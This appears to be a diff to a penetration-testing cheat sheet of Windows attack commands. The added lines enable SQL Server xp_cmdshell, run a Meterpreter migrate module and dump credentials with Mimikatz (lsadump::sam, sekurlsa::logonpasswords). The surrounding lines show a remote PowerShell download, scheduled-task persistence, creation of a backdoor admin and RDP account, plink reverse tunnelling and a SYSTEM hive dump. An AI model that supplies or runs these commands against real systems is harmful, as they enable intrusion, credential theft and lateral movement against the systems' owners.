@@ -13,6 +13,13 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
 schtasks /Query /FO List /v /TN "Driver Support"
 
+sp_configure 'show advanced options',1;
+RECONFIGURE;
+exec sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+
+exec xp_cmdshell 'whoami'
+
 osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"
 
 net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add
@@ -28,6 +35,8 @@ net use q: /delete
 
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
 
+run post/windows/manage/migrate
+
 plink -l username -pw password -R 3389:192.168.1.2:3389 192.168.2.2 -P 22
 portfwd add -l 3389 -p 3389 -r 192.168.1.2
 
@@ -36,3 +45,10 @@ reg save HKLM\SYSTEM SYSTEM
 
 query session /server:
 reset session 1
+
+privilege::debug
+token::elevate
+lsadump::sam
+sekurlsa::logonpasswords
+
+
